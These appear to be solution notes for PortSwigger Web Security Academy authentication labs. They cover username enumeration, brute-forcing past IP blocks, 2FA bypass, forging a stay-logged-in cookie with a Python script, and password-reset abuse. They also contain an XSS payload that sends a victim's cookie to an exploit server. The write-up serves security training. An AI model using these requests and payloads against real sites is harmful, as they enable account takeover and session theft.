## What is the difference between authentication and authorization?

Authentication is the process of verifying that a user is who they claim to be. Authorization involves verifying whether a user is allowed to do something.

For example, authentication determines whether someone attempting to access a website with the username Carlos123 really is the same person who created the account.

Once Carlos123 is authenticated, their permissions determine what they are authorized to do. For example, they may be authorized to access personal information about other users, or perform actions such as deleting another user's account.

### Lab: Username enumeration via different responses

This lab is vulnerable to username enumeration and password brute-force attacks. 

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 
```
curl -X POST "https://ID.web-security-academy.net/login" \
     -H "Cookie: session=..." \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data "username=albuquerque&password=biteme" \
```

### Lab: Username enumeration via subtly different responses

This lab is subtly vulnerable to username enumeration and password brute-force attacks. 

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. 
```
curl -X POST "https://ID.web-security-academy.net/login" \
     -H "Cookie: session=..." \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data "username=arlington&password=1qaz2wsx" \
```
### Lab: Username enumeration via response timing

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.
Your credentials: wiener:peter

- Continue experimenting with usernames and passwords. Pay particular attention to the response times. Notice that when the username is invalid, the response time is roughly the same. However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.

- Send this request to Burp Intruder and select Pitchfork attack from the attack type drop-down menu. Add the X-Forwarded-For header.

- Add payload positions for the X-Forwarded-For header and the username parameter. Set the password to a very long string of characters (about 100 characters should do it). 

```
POST /login HTTP/2
Host: 0af200310303f7ab805eb29e00af00c6.web-security-academy.net
Cookie: session=Qku3MPwbzG5qk6IxHKc20n9UHjNWvU3w
X-Forwarded-For: §ipv4§

username=§username§&password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
### Lab: Broken brute-force protection, IP block

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

Your credentials: wiener:peter
Victim's username: carlos 

Create text file for rbute password from given file:

`$ for i in {1..100}; do echo "carlos"; echo "carlos"; echo "wiener"; done > labsolveusername.txt`

`$ awk '{print $0} NR % 2 == 0 {print "peter"}' portswigger.password > labsolvepassword.txt`



```
POST /login HTTP/2
Host: ID.web-security-academy.net
Cookie: session=...

username=§wiener§&password=§peter§
```
### Lab: Username enumeration via account lock


This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

### Lab: 2FA simple bypass

This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

```
GET /my-account?id=carlos HTTP/2
Host: ID.web-security-academy.net
Cookie: session=...
```
### Lab: 2FA broken logic

This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.

You also have access to the email server to receive your 2FA verification code.

Create the codelist
`seq -w 0001 9999 > numbers`

### Lab: Brute-forcing a stay-logged-in cookie

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his My account page.

-    Your credentials: wiener:peter
-    Victim's username: carlos



Examine the cookie and notice that it is Base64-encoded. 

Its decoded value is `wiener:51dc30ddc473d43a6011e9ebba6ca770`. Study the length and character set of this string and notice that it could be an MD5 hash. Given that the plaintext is your username, you can make an educated guess that this may be a hash of your password. Hash your password using MD5 to confirm that this is the case. We now know that the cookie is constructed as follows:

`base64(username+':'+md5HashOfPassword)`

The script to generate the txt file:
```python
import hashlib
import base64

username = "carlos"
input_file = "password.txt" 
output_file = "base64.md5.txt"

with open(input_file, "r") as infile, open(output_file, "w") as outfile:
    for line in infile:
        password = line.strip()
        md5_hash = hashlib.md5(password.encode()).hexdigest()
        combined = f"{username}:{md5_hash}"
        base64_encoded = base64.b64encode(combined.encode()).decode()
        outfile.write(base64_encoded + "\n")
```
### Lab: Offline password cracking


This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

XSS payload to get the cookie:
```
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```
```
POST /my-account/delete HTTP/2
Host: ID.web-security-academy.net
Cookie: secret=...; stay-logged-in=...; session=...
```

### Lab: Password reset broken logic


This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

```
POST /forgot-password?temp-forgot-password-token=... HTTP/2
Host: ID.web-security-academy.net
Cookie: session=...


temp-forgot-password-token=...&username=carlos&new-password-1=a&new-password-2=a
```
